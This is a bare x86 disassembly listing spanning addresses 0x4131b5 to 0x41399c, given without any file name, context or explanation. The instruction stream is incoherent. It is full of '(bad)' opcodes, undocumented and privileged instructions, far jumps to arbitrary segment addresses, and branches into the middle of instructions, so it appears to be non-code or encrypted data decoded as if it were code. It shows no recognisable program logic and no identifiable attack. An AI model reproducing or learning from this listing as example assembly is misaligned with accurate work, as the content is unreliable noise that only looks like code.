  4131b5:	dec    edx
  4131b6:	aad    0x70
  4131b8:	cdq    
  4131b9:	and    BYTE PTR [ebp+0x45],ah
  4131bc:	push   0x227c2e35
  4131c1:	mov    eax,ds:0x4fee3e73
  4131c6:	adc    ecx,ebp
  4131c8:	shl    DWORD PTR [ebp+edx*8+0x189f320d],cl
  4131cf:	fmul   QWORD PTR [esi+0x19]
  4131d2:	out    dx,al
  4131d3:	sub    al,0xf
  4131d5:	and    BYTE PTR [eax+0x3d],bl
  4131d8:	mov    dh,BYTE PTR [eax+0x47]
  4131db:	rol    DWORD PTR [eax],0xf3
  4131de:	aad    0x44
  4131e0:	xchg   esp,eax
  4131e1:	xlat   BYTE PTR ds:[ebx]
  4131e2:	mov    bl,0x7f
  4131e4:	mov    ds:0x5c7562a4,eax
  4131e9:	jo     0x413220
  4131eb:	inc    edx
  4131ec:	xchg   DWORD PTR [eax-0x3298bcc3],edi
  4131f2:	aad    0x6c
  4131f4:	nop
  4131f5:	icebp  
  4131f6:	mov    eax,ds:0xeed609aa
  4131fb:	jnp    0x413245
  4131fd:	jmp    0x41324c
  4131ff:	inc    edx
  413200:	inc    ecx
  413201:	add    eax,edi
  413203:	out    dx,al
  413204:	xchg   edx,eax
  413205:	repz rol dl,0x71
  413209:	mov    ebp,0xef35e881
  41320e:	fdivr  st(2),st
  413210:	pop    DWORD PTR [ecx]
  413212:	fst    DWORD PTR [ebx+0x1429ab1b]
  413218:	sbb    ah,BYTE PTR [eax]
  41321a:	cld    
  41321b:	mov    ebx,0xfac12b25
  413220:	jno    0x4131d3
  413222:	syscall 
  413224:	xor    DWORD PTR [ecx+0x7c],esi
  413227:	xchg   BYTE PTR [edx],bh
  413229:	and    BYTE PTR [ebx],dl
  41322b:	or     BYTE PTR [ebx],dh
  41322d:	sbb    BYTE PTR [eax-0x2a0ef2ed],al
  413233:	mov    DWORD PTR [eax-0x30],ebp
  413236:	std    
  413237:	xor    al,0xec
  413239:	dec    ecx
  41323a:	rcl    BYTE PTR [esi+esi*1+0x6cf5fec7],cl
  413241:	mov    edx,DWORD PTR [edx]
  413243:	test   DWORD PTR [edx],ecx
  413245:	push   eax
  413246:	xchg   bh,ch
  413248:	je     0x413294
  41324a:	ret    
  41324b:	sub    al,0xfe
  41324d:	and    DWORD PTR ds:[ebp-0x5a],ecx
  413251:	mov    WORD PTR [ecx],gs
  413253:	jle    0x41327a
  413255:	out    dx,al
  413256:	retf   0xc6ed
  413259:	lahf   
  41325a:	push   cs
  41325b:	fidiv  DWORD PTR es:[ebx]
  41325e:	xchg   ecx,eax
  41325f:	xchg   ebx,eax
  413260:	xor    eax,0x28b54849
  413265:	in     eax,dx
  413266:	push   esp
  413267:	aas    
  413268:	or     cl,BYTE PTR cs:[esi+0x4c]
  41326c:	jno    0x41321f
  41326e:	(bad)  
  41326f:	popf   
  413270:	nop
  413271:	jne    0x4131fc
  413273:	lods   al,BYTE PTR ds:[esi]
  413274:	adc    esp,DWORD PTR [ebx]
  413276:	push   esi
  413277:	ror    BYTE PTR [esi],0xca
  41327a:	xchg   ebx,eax
  41327b:	loopne 0x4132bc
  41327d:	push   ds
  41327e:	push   cs
  41327f:	cmp    al,0x3c
  413281:	and    BYTE PTR [ecx+0x5c],ah
  413284:	jmp    0xb8ef420c
  413289:	and    dl,BYTE PTR [eax]
  41328b:	add    al,0x45
  41328d:	xchg   esp,eax
  41328e:	scas   al,BYTE PTR es:[edi]
  41328f:	repz add ah,al
  413292:	icebp  
  413293:	in     al,0xac
  413295:	nop
  413296:	bnd ja 0x4132c6
  413299:	jmp    0xfaa447b4
  41329e:	xchg   esp,eax
  41329f:	sti    
  4132a0:	sar    DWORD PTR [ebx+0x18ebae01],1
  4132a6:	push   esi
  4132a7:	(bad)  
  4132a8:	add    cl,0xf0
  4132ab:	or     ah,BYTE PTR [edx-0x3d26ed6e]
  4132b1:	mov    eax,ds:0xa2b71b9b
  4132b6:	popa   
  4132b7:	cmc    
  4132b8:	push   esi
  4132b9:	mov    al,ds:0x2f32d453
  4132be:	cwde   
  4132bf:	xchg   esi,eax
  4132c0:	call   0x7e10c866
  4132c5:	push   ecx
  4132c6:	mov    ecx,0x7ed771ff
  4132cb:	lahf   
  4132cc:	pusha  
  4132cd:	gs dec ebp
  4132cf:	clc    
  4132d0:	and    al,0x20
  4132d2:	or     ecx,DWORD PTR [ebx]
  4132d4:	or     esi,eax
  4132d6:	inc    edi
  4132d7:	adc    esi,esi
  4132d9:	pop    edx
  4132da:	(bad)  
  4132db:	(bad)  
  4132dc:	dec    esp
  4132dd:	push   esp
  4132de:	xchg   bl,ch
  4132e0:	jl     0x4132f6
  4132e2:	push   ss
  4132e3:	push   ebx
  4132e4:	int    0x4
  4132e6:	aad    0xb0
  4132e8:	sar    BYTE PTR [ebx-0x39b919c],0xf5
  4132ef:	popa   
  4132f0:	enter  0x5764,0x1e
  4132f4:	jno    0x413323
  4132f6:	std    
  4132f7:	jmp    0x1f7a:0x23513fb2
  4132fe:	jnp    0x413335
  413300:	sub    edx,DWORD PTR [edi-0x1f8bf874]
  413306:	or     eax,0x435e8d15
  41330b:	cmc    
  41330c:	xor    al,0x45
  41330e:	adc    esi,DWORD PTR [edx-0x325b137b]
  413314:	jmp    0x7e93:0x7106103c
  41331b:	cmp    al,0x86
  41331d:	add    DWORD PTR [ebx],ecx
  41331f:	and    eax,0x55241c80
  413324:	pushf  
  413325:	push   DWORD PTR [eax+0x3d854581]
  41332b:	jne    0x4132dc
  41332d:	push   ecx
  41332e:	sub    BYTE PTR [esi-0x551d88],al
  413334:	jno    0x4132e9
  413336:	(bad)  
  413337:	adc    BYTE PTR [edx-0x3cd69ab],bh
  41333d:	pop    ds
  41333e:	push   ebx
  41333f:	xchg   ebp,eax
  413340:	mov    ds:0x589eb191,eax
  413345:	leave  
  413346:	aad    0xe0
  413348:	iret   
  413349:	jns    0x4132f5
  41334b:	in     al,dx
  41334c:	test   eax,0x93914b1c
  413351:	push   ebx
  413352:	sbb    eax,0xd5caf8cb
  413357:	test   eax,0x91c0fa13
  41335c:	push   ds
  41335d:	and    BYTE PTR [esi+0x1d1868da],ch
  413363:	inc    ecx
  413364:	call   0xc80:0xdb15d886
  41336b:	(bad)  
  41336c:	sbb    BYTE PTR [bp+di-0x64],al
  413370:	into   
  413371:	pop    ds
  413372:	rol    BYTE PTR [esi+0x6850fb8d],0x19
  413379:	xchg   edi,eax
  41337a:	adc    DWORD PTR [esi-0x3044e011],ebp
  413380:	lds    esp,FWORD PTR [edx]
  413382:	ret    
  413383:	or     DWORD PTR [esi+0x21],ebx
  413386:	int    0x42
  413388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41338a:	rcr    DWORD PTR [edx],1
  41338c:	mov    ebp,0x7186a3e3
  413391:	jmp    0xbddfb4a3
  413396:	xor    dh,dh
  413398:	jmp    0xbaa:0xc3fdc71f
  41339f:	mov    cs,WORD PTR ds:0x310f0d70
  4133a5:	and    DWORD PTR [ebp+0x20],ebp
  4133a8:	div    dl
  4133aa:	(bad)  
  4133ab:	or     BYTE PTR [ecx-0x32],al
  4133ae:	out    0xcc,eax
  4133b0:	adc    esp,DWORD PTR [ecx+0x47]
  4133b3:	fwait
  4133b4:	and    ebp,DWORD PTR [edx]
  4133b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b7:	jne    0x41339c
  4133b9:	inc    esp
  4133ba:	dec    edi
  4133bb:	scas   eax,DWORD PTR es:[edi]
  4133bc:	loop   0x413439
  4133be:	aad    0xa7
  4133c0:	dec    esp
  4133c1:	cmp    BYTE PTR [eax],ch
  4133c3:	mov    cs,esi
  4133c5:	dec    ebp
  4133c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133c7:	inc    eax
  4133c8:	icebp  
  4133c9:	sbb    dl,BYTE PTR [edi-0x26]
  4133cc:	loope  0x4133c9
  4133ce:	scas   al,BYTE PTR es:[edi]
  4133cf:	dec    ecx
  4133d0:	shl    BYTE PTR [eax-0xc],1
  4133d3:	test   eax,0xfa55ebca
  4133d8:	adc    BYTE PTR [esi+0x1f],ah
  4133db:	pop    es
  4133dc:	rcr    DWORD PTR [edi],cl
  4133de:	jge    0x4133d8
  4133e0:	out    dx,al
  4133e1:	adc    edx,ecx
  4133e3:	les    esp,FWORD PTR ds:0x715d528c
  4133e9:	cmc    
  4133ea:	pop    esp
  4133eb:	xchg   edx,eax
  4133ec:	outs   dx,DWORD PTR ds:[esi]
  4133ed:	ins    BYTE PTR es:[edi],dx
  4133ee:	ds data16 aad 0x3e
  4133f2:	pop    ss
  4133f3:	fs popf 
  4133f5:	fcomip st,st(3)
  4133f7:	mov    bh,0x7d
  4133f9:	xchg   edi,eax
  4133fa:	jmp    0xa8d:0x367d714d
  413401:	pop    ebx
  413402:	or     eax,0xe5021ba0
  413407:	and    al,0x7
  413409:	and    ebp,DWORD PTR ds:0x1bce3f1d
  41340f:	scas   eax,DWORD PTR es:[edi]
  413410:	and    ecx,ebp
  413412:	jns    0x413430
  413414:	jno    0x413460
  413416:	jmp    0x366f:0xd44d20b5
  41341d:	and    BYTE PTR [esi+0x7c],cl
  413420:	adc    al,0x8c
  413422:	imul   eax,DWORD PTR ds:0x33c7295f,0xf5b60971
  41342c:	ja     0x41340a
  41342e:	lods   eax,DWORD PTR ds:[esi]
  41342f:	add    dh,dl
  413431:	pop    ds
  413432:	pop    ebp
  413433:	int    0x1b
  413435:	imul   ebx,DWORD PTR [edi+ebx*8],0xa149073d
  41343c:	and    DWORD PTR [ebp+0x8],0xffffff86
  413440:	js     0x41345e
  413442:	push   0x1d
  413444:	ror    DWORD PTR [ebx],0x64
  413447:	sahf   
  413448:	stc    
  413449:	add    DWORD PTR es:[ebp-0x22],0xa67566d4
  413451:	cmp    eax,0xea7124ff
  413456:	or     ah,dl
  413458:	fnsave [ebp+esi*4+0x7d2eac31]
  41345f:	fsubr  DWORD PTR [ebx-0x7e2faa60]
  413465:	xchg   ebp,eax
  413466:	cmp    edx,DWORD PTR [ebp-0x7bfc738f]
  41346c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41346d:	dec    eax
  41346e:	(bad)  
  41346f:	pop    edx
  413470:	xchg   edi,eax
  413471:	add    eax,0xd2d67545
  413476:	xor    ah,BYTE PTR [esi+0x2]
  413479:	mov    eax,0xfe7213f9
  41347e:	sbb    BYTE PTR [esi+0x4d893f34],al
  413484:	mov    eax,ds:0x7fa35806
  413489:	mov    al,ds:0x20f4b2c7
  41348e:	dec    ebx
  41348f:	and    eax,0xd57cc2a5
  413494:	pushf  
  413495:	loopne 0x413457
  413497:	inc    ebx
  413498:	jbe    0x4134cf
  41349a:	cdq    
  41349b:	inc    esi
  41349c:	dec    ebp
  41349d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41349e:	push   ebp
  41349f:	test   bh,0x94
  4134a2:	inc    esi
  4134a3:	jne    0x4134df
  4134a5:	jg     0x413482
  4134a7:	ja     0x4134ec
  4134a9:	or     al,0x17
  4134ab:	jecxz  0x41345b
  4134ad:	jo     0x4134e0
  4134af:	out    0x71,eax
  4134b1:	pop    esp
  4134b2:	bound  edi,QWORD PTR [ecx]
  4134b4:	daa    
  4134b5:	test   DWORD PTR ds:0xdc204f95,eax
  4134bb:	and    al,BYTE PTR [ecx+0x15]
  4134be:	lods   al,BYTE PTR ds:[esi]
  4134bf:	sbb    edx,edi
  4134c1:	xchg   DWORD PTR [esi+0x0],ecx
  4134c4:	jno    0x413508
  4134c6:	xchg   edx,eax
  4134c7:	shl    DWORD PTR [edi+0x6e],cl
  4134ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134cb:	pop    eax
  4134cc:	sbb    BYTE PTR [edi],0xad
  4134cf:	outs   dx,BYTE PTR ds:[esi]
  4134d0:	es dec eax
  4134d2:	cmc    
  4134d3:	stos   BYTE PTR es:[edi],al
  4134d4:	rol    DWORD PTR [eax+0x6d594ed5],1
  4134da:	daa    
  4134db:	fadd   st(2),st
  4134dd:	or     al,al
  4134df:	jns    0x413494
  4134e1:	retf   0x9a8f
  4134e4:	mov    esp,0xcaf59ddf
  4134e9:	das    
  4134ea:	aad    0x12
  4134ec:	jmp    0x3013:0x2ea818ee
  4134f3:	jne    0x413558
  4134f5:	mov    ecx,0xe5dae577
  4134fa:	mov    edi,0xd5a3ec01
  4134ff:	mov    eax,ds:0x5c2ed0ad
  413504:	sbb    DWORD PTR [ecx+0x28f37bea],eax
  41350a:	outs   dx,BYTE PTR fs:[esi]
  41350c:	sub    eax,0xb02cbae0
  413511:	not    ch
  413513:	adc    al,0x16
  413515:	loop   0x41354e
  413517:	jmp    0xadcca0ec
  41351c:	jg     0x413566
  41351e:	push   ebp
  41351f:	push   esi
  413520:	mov    dl,BYTE PTR [ecx]
  413522:	mul    ah
  413524:	cmp    bl,bl
  413526:	leave  
  413527:	ss jae 0x413513
  41352a:	mov    al,ds:0x78de3efc
  41352f:	aad    0xc
  413531:	pop    edx
  413532:	inc    eax
  413533:	jne    0x4134c4
  413535:	mov    esp,ecx
  413537:	push   ds
  413538:	add    eax,0x71158335
  41353d:	xchg   ecx,eax
  41353e:	push   ss
  41353f:	(bad)  
  413540:	jb     0x4135b2
  413542:	nop
  413543:	cwde   
  413544:	outs   dx,DWORD PTR ds:[esi]
  413545:	ds push edx
  413547:	stc    
  413548:	in     eax,0xdf
  41354a:	xor    DWORD PTR [esp+eax*4+0x61],edx
  41354e:	xchg   edi,eax
  41354f:	cmp    BYTE PTR [eax+0x7032d13c],dh
  413555:	mov    eax,ds:0x7df97f6f
  41355a:	aaa    
  41355b:	mov    dh,0x69
  41355d:	lahf   
  41355e:	jmp    0x68d9:0x98602774
  413565:	dec    ebx
  413566:	fnstsw WORD PTR [eax-0x7c]
  413569:	fwait
  41356a:	xor    al,0x30
  41356c:	jno    0x41354c
  41356e:	(bad)
  413571:	sbb    edx,edi
  413573:	je     0x413592
  413575:	enter  0x4407,0x3a
  413579:	xor    eax,0xc1f05543
  41357e:	(bad)  
  41357f:	xchg   esp,eax
  413580:	leave  
  413581:	xor    ecx,edi
  413583:	jmp    0x15f8:0xaab1d744
  41358a:	data16 jne 0x4135d3
  41358d:	mov    bh,0x6d
  41358f:	fidiv  DWORD PTR [ebp+0x2e]
  413592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413593:	in     al,0x7c
  413595:	fisttp DWORD PTR [ebx-0xbdffc6c]
  41359b:	fwait
  41359c:	pop    ebx
  41359d:	dec    ebp
  41359e:	dec    edx
  41359f:	fwait
  4135a0:	pop    esp
  4135a1:	jecxz  0x4135c5
  4135a3:	js     0x41360e
  4135a5:	iret   
  4135a6:	scas   eax,DWORD PTR es:[edi]
  4135a7:	stc    
  4135a8:	xor    DWORD PTR [edi],esp
  4135aa:	sahf   
  4135ab:	int3   
  4135ac:	jno    0x4135fc
  4135ae:	jo     0x4135e9
  4135b0:	mov    cs,WORD PTR [edi+edi*1+0x500833ff]
  4135b7:	xchg   esp,eax
  4135b8:	shl    BYTE PTR [ecx],cl
  4135ba:	hlt    
  4135bb:	xor    al,0x2
  4135bd:	nop
  4135be:	loopne 0x413571
  4135c0:	(bad)  
  4135c2:	jmp    0x41355b
  4135c4:	mov    cl,0xf9
  4135c6:	aad    0xcb
  4135c8:	ja     0x4135f6
  4135ca:	dec    edi
  4135cb:	push   ss
  4135cc:	xchg   ebx,eax
  4135cd:	pop    ds
  4135ce:	ss cmp al,0x95
  4135d1:	xchg   edi,eax
  4135d2:	pop    edi
  4135d3:	push   edx
  4135d4:	jbe    0x41364f
  4135d6:	push   eax
  4135d7:	loope  0x41364b
  4135d9:	jg     0x413591
  4135db:	xchg   DWORD PTR [eax-0x3c],ecx
  4135de:	jnp    0x41357c
  4135e0:	pop    ecx
  4135e1:	lea    ebx,ds:0x7370a275
  4135e7:	xor    ch,bl
  4135e9:	jne    0x413576
  4135eb:	test   DWORD PTR [ecx+0x7f],esi
  4135ee:	stos   BYTE PTR es:[edi],al
  4135ef:	push   es
  4135f0:	pop    ecx
  4135f1:	inc    esp
  4135f2:	pop    edi
  4135f3:	aas    
  4135f4:	xchg   edi,eax
  4135f5:	pop    ds
  4135f6:	or     DWORD PTR [eax+0x24],esp
  4135f9:	imul   edi,edx,0xffffffcf
  4135fc:	push   edx
  4135fd:	dec    ecx
  4135fe:	aad    0x62
  413600:	dec    esp
  413601:	shl    DWORD PTR [edi-0x2f],0x7c
  413605:	fnstcw WORD PTR [eax+0x75]
  413608:	pop    edx
  413609:	aaa    
  41360a:	cmp    ebx,DWORD PTR [ebp+0x53]
  41360d:	aam    0x10
  41360f:	mov    ?,WORD PTR [ecx-0x6a]
  413612:	mov    BYTE PTR [esi],dh
  413614:	mov    edi,0x16226344
  413619:	and    BYTE PTR [eax+0x89097d2],ch
  41361f:	xchg   ebp,eax
  413620:	aam    0xd3
  413622:	repnz hlt 
  413624:	jle    0x4136a5
  413626:	adc    eax,0x34485fb1
  41362b:	sbb    BYTE PTR gs:[edx],dl
  41362e:	inc    ebx
  41362f:	jbe    0x4135eb
  413631:	mov    eax,0x2f2b64
  413636:	bound  ecx,QWORD PTR [ecx+0x67]
  413639:	(bad)  
  41363a:	in     al,0x63
  41363c:	mov    ebp,0x712b9691
  413641:	loopne 0x413684
  413643:	(bad)  
  413644:	call   0xf9b67633
  413649:	dec    ebx
  41364a:	dec    ebp
  41364b:	test   al,0xec
  41364d:	add    DWORD PTR [ecx],ebx
  41364f:	mov    esp,0x53282071
  413654:	add    BYTE PTR [eax],dl
  413656:	and    al,0x67
  413658:	pushf  
  413659:	addr16 fxch st(6)
  41365c:	jno    0x41361e
  41365e:	jg     0x41360d
  413660:	jecxz  0x413602
  413662:	pop    ebx
  413663:	dec    ecx
  413664:	jno    0x413619
  413666:	outs   dx,DWORD PTR ds:[esi]
  413667:	mov    dl,0x10
  413669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41366a:	ins    BYTE PTR es:[edi],dx
  41366b:	mov    eax,0x6cda1f72
  413670:	mov    edi,0x5f5b1a27
  413675:	out    0xd5,al
  413677:	call   0x598d:0x3454770a
  41367e:	jp     0x4136f5
  413680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413681:	mov    ah,BYTE PTR [edx+ebp*1+0x105e9617]
  413688:	jno    0x41363c
  41368a:	dec    ebp
  41368b:	sbb    eax,0x52954c5d
  413690:	inc    esp
  413691:	and    BYTE PTR [ebx+0x1a],ah
  413694:	mov    cl,0x48
  413696:	or     eax,0xf423e75f
  41369b:	repnz sbb al,0x18
  41369e:	push   esi
  41369f:	fcomip st,st(0)
  4136a1:	rcr    BYTE PTR [esi-0x64e07d46],1
  4136a7:	pop    ebx
  4136a8:	fcmovu st,st(2)
  4136aa:	inc    esi
  4136ab:	outs   dx,BYTE PTR ds:[esi]
  4136ac:	sbb    edx,esi
  4136ae:	icebp  
  4136af:	xchg   eax,edx
  4136b1:	int3   
  4136b2:	adc    eax,0x21b49d8
  4136b7:	ret    
  4136b8:	mov    eax,0x7717ba1f
  4136bd:	jmp    0xb5d5:0x88cf8198
  4136c4:	es jns 0x41365b
  4136c7:	stos   DWORD PTR es:[edi],eax
  4136c8:	dec    ebp
  4136c9:	pop    esi
  4136ca:	retf   
  4136cb:	jne    0x413739
  4136cd:	loopne 0x413742
  4136cf:	call   0xce71:0x12be36a2
  4136d6:	sbb    BYTE PTR [esi+0x184cb662],cl
  4136dc:	and    BYTE PTR gs:[eax-0x26],ch
  4136e0:	inc    eax
  4136e1:	xor    eax,DWORD PTR [esi-0x2a473ca4]
  4136e7:	cmp    DWORD PTR [esi-0x1dd43f05],ebx
  4136ed:	mov    ah,0x71
  4136ef:	jne    0x413683
  4136f1:	leave  
  4136f2:	lds    esi,FWORD PTR [edx+0x51f74bcb]
  4136f8:	push   edi
  4136f9:	xchg   BYTE PTR ds:0x65a066f6,cl
  4136ff:	jl     0x41370b
  413701:	jo     0x4136bb
  413703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413704:	fcomp  QWORD PTR [edi]
  413706:	lahf   
  413707:	inc    ebp
  413708:	and    al,cl
  41370a:	push   0xd1bae12b
  41370f:	adc    eax,0x533f0671
  413714:	mov    ds:0xc89fc9fb,eax
  413719:	pop    ds
  41371a:	imul   edi,esi,0xfffffff1
  41371d:	stc    
  41371e:	fisub  DWORD PTR [edi]
  413720:	jg     0x4136a2
  413722:	in     al,0x40
  413724:	push   0x96f5a8aa
  413729:	inc    ecx
  41372a:	dec    ecx
  41372b:	cmp    BYTE PTR [esi-0x72394ee1],0xc6
  413732:	mov    al,ds:0xd5b9e061
  413737:	cli    
  413738:	pusha  
  413739:	mov    dl,0xd2
  41373b:	div    al
  41373d:	xchg   esi,eax
  41373e:	mov    ecx,0xa9595965
  413743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413744:	cld    
  413745:	mov    edi,0x7ef1ce74
  41374a:	stc    
  41374b:	mov    dh,0x51
  41374d:	jl     0x413724
  41374f:	mov    ebx,0xbbcb23c3
  413754:	mov    ss,WORD PTR [edx-0x38d18b28]
  41375a:	jle    0x4136f1
  41375c:	sbb    DWORD PTR [ebx],ebp
  41375e:	cmp    edx,ebp
  413760:	je     0x41370a
  413762:	sub    dh,BYTE PTR [ecx+0x15235a9f]
  413768:	jnp    0x4137ad
  41376a:	and    BYTE PTR [ebp+0x4f],dh
  41376d:	ss dec ebp
  41376f:	and    dl,BYTE PTR [eax]
  413771:	test   DWORD PTR [ebp-0x5b2e8ee6],eax
  413777:	xor    eax,0x4572d289
  41377c:	ja     0x4137a0
  41377e:	leave  
  41377f:	(bad)  
  413780:	loope  0x413790
  413782:	fs clc 
  413784:	push   0x3d948220
  413789:	imul   edx,ebp,0x15
  41378c:	ror    BYTE PTR ds:0x5d434850,0x92
  413793:	jne    0x41373a
  413795:	sbb    eax,0x686afbd2
  41379a:	imul   ebp,DWORD PTR [edi],0x1dd91ce4
  4137a0:	int3   
  4137a1:	or     al,0xdc
  4137a3:	inc    esi
  4137a4:	hlt    
  4137a5:	out    0xca,eax
  4137a7:	mov    edi,0xe3f6203d
  4137ac:	test   al,0x73
  4137ae:	stos   DWORD PTR es:[edi],eax
  4137af:	or     eax,0x91d535c9
  4137b4:	pop    ecx
  4137b5:	cmp    al,0x28
  4137b7:	dec    ebp
  4137b8:	adc    eax,0x86757b82
  4137bd:	les    ebx,FWORD PTR ds:0x4622115
  4137c3:	add    esi,DWORD PTR [ecx-0x1c]
  4137c6:	lock pop edi
  4137c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137c9:	pusha  
  4137ca:	push   ds
  4137cb:	inc    edx
  4137cc:	icebp  
  4137cd:	pop    ds
  4137ce:	dec    ecx
  4137cf:	jnp    0x4137ee
  4137d1:	or     eax,0xbb89658
  4137d6:	in     al,0x49
  4137d8:	and    esp,ebx
  4137da:	xor    dh,BYTE PTR ds:0xdfd98052
  4137e0:	jnp    0x413801
  4137e2:	cmp    esi,DWORD PTR [ecx-0x10]
  4137e5:	mov    edi,0x78cd0312
  4137ea:	icebp  
  4137eb:	mov    dh,0xf3
  4137ed:	cmp    ebp,edx
  4137ef:	xchg   DWORD PTR [ebp+0x38664d41],esp
  4137f5:	and    DWORD PTR [ecx-0x5eea4940],edi
  4137fb:	cmp    esp,esp
  4137fd:	dec    edi
  4137fe:	stos   DWORD PTR es:[edi],eax
  4137ff:	cs jno 0x413823
  413802:	adc    BYTE PTR [esi-0x49aa96],ah
  413808:	lea    ebx,[edi]
  41380a:	ds hlt 
  41380c:	pop    es
  41380d:	or     bl,BYTE PTR [esi]
  41380f:	push   esp
  413810:	mov    esp,DWORD PTR [edx-0x2b]
  413813:	retf   
  413814:	ja     0x413868
  413816:	and    DWORD PTR [ebp-0x6bbcccb6],0xb5fbdf3d
  413820:	rcl    esp,cl
  413822:	xor    cl,BYTE PTR [eax+edx*2+0x40]
  413826:	adc    al,0x42
  413828:	jno    0x413882
  41382a:	int    0xe1
  41382c:	xor    DWORD PTR [eax+0x11],esp
  41382f:	dec    ecx
  413830:	pop    esp
  413831:	and    BYTE PTR [edx+0x7b],bl
  413834:	jns    0x41388b
  413836:	aam    0xc6
  413838:	add    edi,ecx
  41383a:	aad    0xad
  41383c:	jmp    0x41384a
  41383e:	sbb    eax,0x83c22199
  413843:	jp     0x413820
  413845:	call   0xb9c2:0x9f773588
  41384c:	jp     0x4137d0
  41384e:	aad    0xc7
  413850:	adc    BYTE PTR [esi+eax*1-0x11ee0283],cl
  413857:	je     0x41389f
  413859:	test   eax,0x952e8c9b
  41385e:	mov    ds:0x787b78a1,al
  413863:	lods   al,BYTE PTR es:[esi]
  413865:	dec    esp
  413866:	test   DWORD PTR [eax],ecx
  413868:	xlat   BYTE PTR ds:[ebx]
  413869:	int3   
  41386a:	imul   esi,DWORD PTR [ebp-0x6b],0x1a3f6d2
  413871:	mov    ebx,0x5c75958f
  413876:	mov    eax,ds:0x55d26eb4
  41387b:	ror    edx,cl
  41387d:	push   esp
  41387e:	or     esi,DWORD PTR [ebp+0x7b]
  413881:	jecxz  0x4138fc
  413883:	loop   0x4138d7
  413885:	imul   edx,DWORD PTR ds:0xa3e174da,0xffffffcb
  41388c:	stos   DWORD PTR es:[edi],eax
  41388d:	push   cs
  41388e:	add    DWORD PTR [ebp+0x4b],0x41
  413892:	loop   0x413816
  413894:	rcl    BYTE PTR [ebx-0x5fcf387c],0xd7
  41389b:	sbb    DWORD PTR [ecx-0x3d],esp
  41389e:	mov    eax,0xd579677a
  4138a3:	and    DWORD PTR [eax+0x19027042],ebp
  4138a9:	(bad)  
  4138aa:	sar    BYTE PTR [eax-0x64],cl
  4138ad:	adc    DWORD PTR [esi-0x7a],ebp
  4138b0:	add    ah,cl
  4138b2:	jne    0x41389c
  4138b4:	xchg   edi,eax
  4138b5:	xchg   esi,eax
  4138b6:	dec    edi
  4138b7:	xlat   BYTE PTR ds:[ebx]
  4138b8:	scas   eax,DWORD PTR es:[edi]
  4138b9:	inc    eax
  4138ba:	imul   esi,DWORD PTR [ebp+0x6b],0xd
  4138be:	scas   al,BYTE PTR es:[edi]
  4138bf:	pop    ebx
  4138c0:	test   al,0xd7
  4138c2:	popa   
  4138c3:	js     0x41385f
  4138c5:	aad    0xc6
  4138c7:	sbb    al,0x47
  4138c9:	fldenv [ebp-0x17]
  4138cc:	cmp    eax,0xea64d55d
  4138d1:	jns    0x413855
  4138d3:	lds    esp,FWORD PTR [eax+0x529383a3]
  4138d9:	pop    edx
  4138da:	pop    es
  4138db:	cmc    
  4138dc:	int3   
  4138dd:	ins    DWORD PTR es:[edi],dx
  4138de:	mov    eax,0x711ae7f
  4138e3:	add    BYTE PTR [ecx],ah
  4138e5:	mov    al,0x2a
  4138e7:	sbb    al,0xa1
  4138e9:	test   eax,0x5f377663
  4138ee:	mov    ecx,0x3812aa44
  4138f3:	push   ebp
  4138f4:	loop   0x41393b
  4138f6:	aad    0x18
  4138f8:	push   edi
  4138f9:	or     BYTE PTR [edx-0x66069cba],cl
  4138ff:	js     0x413979
  413901:	push   es
  413902:	or     BYTE PTR [ebp-0x41],0xd5
  413906:	lea    eax,[edi-0x211cd72e]
  41390c:	sub    esi,DWORD PTR [edi]
  41390e:	int    0x55
  413910:	in     eax,0xb5
  413912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413913:	mov    edi,0xa93a3281
  413918:	sahf   
  413919:	pop    ds
  41391a:	dec    esp
  41391b:	neg    BYTE PTR [edi+0x2d]
  41391e:	inc    esi
  41391f:	data16 jno 0x4138e9
  413922:	add    al,0x95
  413924:	or     esi,DWORD PTR [esi+0x19]
  413927:	jmp    0xd2fb:0x873b2017
  41392e:	stos   BYTE PTR es:[edi],al
  41392f:	jae    0x4138f0
  413931:	lods   al,BYTE PTR ds:[esi]
  413932:	aad    0x39
  413934:	push   esi
  413935:	jns    0x4138dd
  413937:	sub    BYTE PTR [ecx+ebx*1-0x27da8b16],0xfa
  41393f:	lods   eax,DWORD PTR ds:[esi]
  413940:	xor    eax,0x71dedc6d
  413945:	out    dx,eax
  413946:	loop   0x413959
  413948:	cmc    
  413949:	add    ch,BYTE PTR [ebx]
  41394b:	loopne 0x4138e5
  41394d:	pop    ds
  41394e:	push   ds
  41394f:	inc    ecx
  413950:	daa    
  413951:	sti    
  413952:	outs   dx,BYTE PTR ds:[esi]
  413953:	dec    edx
  413954:	sub    edx,esi
  413956:	and    DWORD PTR [ecx+eiz*1+0x20],edi
  41395a:	jle    0x4139b4
  41395c:	add    dh,al
  41395e:	stos   DWORD PTR es:[edi],eax
  41395f:	lea    edx,[ecx+0x2e]
  413962:	jne    0x4139a0
  413964:	fisubr DWORD PTR [edx+0x3e7d2fb5]
  41396a:	jo     0x41392f
  41396c:	jno    0x4139df
  41396e:	and    al,BYTE PTR [edi+ebx*8+0x78]
  413972:	and    al,0x64
  413974:	fsub   DWORD PTR [edx]
  413976:	std    
  413977:	(bad)  
  413978:	dec    BYTE PTR [edx+0x77]
  41397b:	fcom   DWORD PTR [ecx-0x8]
  41397e:	(bad)  
  41397f:	repz adc BYTE PTR [ebp+edx*2-0x295fcfb4],0x54
  413988:	(bad)  
  413989:	bound  edi,QWORD PTR [edi]
  41398b:	jne    0x41399a
  41398d:	sub    ecx,ebx
  41398f:	cmp    BYTE PTR [edi+0x6e],dl
  413992:	in     eax,0xb3
  413994:	jno    0x4139a1
  413996:	aam    0x91
  413998:	ss ret 0xe786
  41399c:	cmp    BYTE PTR [esp+ebp*4-0x3e],al
